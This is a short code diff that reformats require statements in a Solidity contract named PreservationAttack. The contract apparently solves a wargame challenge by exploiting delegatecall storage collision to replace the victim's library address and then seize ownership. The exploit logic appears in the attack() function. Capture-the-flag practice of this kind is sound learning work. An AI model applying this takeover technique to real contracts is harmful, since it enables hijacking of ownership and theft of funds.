@@ -17,17 +17,11 @@ contract PreservationAttack {
     function attack() external {
         victimPreservation.setFirstTime(uint256(uint160(address(this))));
 
-        require(
-            address(this) == victimPreservation.timeZone1Library(),
-            "Preservation: Wrong address"
-        );
+        require(address(this) == victimPreservation.timeZone1Library(), "Preservation: Wrong address");
 
         victimPreservation.setFirstTime(uint256(uint160(msg.sender)));
 
-        require(
-            msg.sender == victimPreservation.owner(),
-            "Preservation: Attack failed"
-        );
+        require(msg.sender == victimPreservation.owner(), "Preservation: Attack failed");
     }
 
     function setTime(uint256 _time) public {
